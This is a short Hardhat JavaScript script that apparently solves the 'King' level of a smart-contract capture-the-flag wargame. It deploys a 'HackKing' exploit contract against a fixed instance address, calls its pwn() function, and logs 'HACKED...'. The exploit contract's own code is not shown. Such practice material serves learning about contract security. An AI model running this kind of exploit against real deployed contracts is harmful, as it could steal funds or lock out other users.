const { ethers } = require("hardhat")
const hre = require("hardhat")

const instanceAddress = "0xF7B137B28EeAaf7C3d95aE51B8E745E2Af2d0c0d"

async function main() {
    const king = await hre.ethers.getContractAt("King", instanceAddress)

    const HackKing = await ethers.getContractFactory("HackKing")
    // send more than 0,01ETH (King's contract balance) when deploying
    const hackKing = await HackKing.deploy(instanceAddress)

    await hackKing.deployed()

    console.log(`Exploit deployed to: ${hackKing.address}`)

    console.log("---------------------------------------")

    await hackKing.pwn()

    console.log("HACKED...")
}

main().catch((error) => {
    console.error(error)
    process.exitCode = 1
})
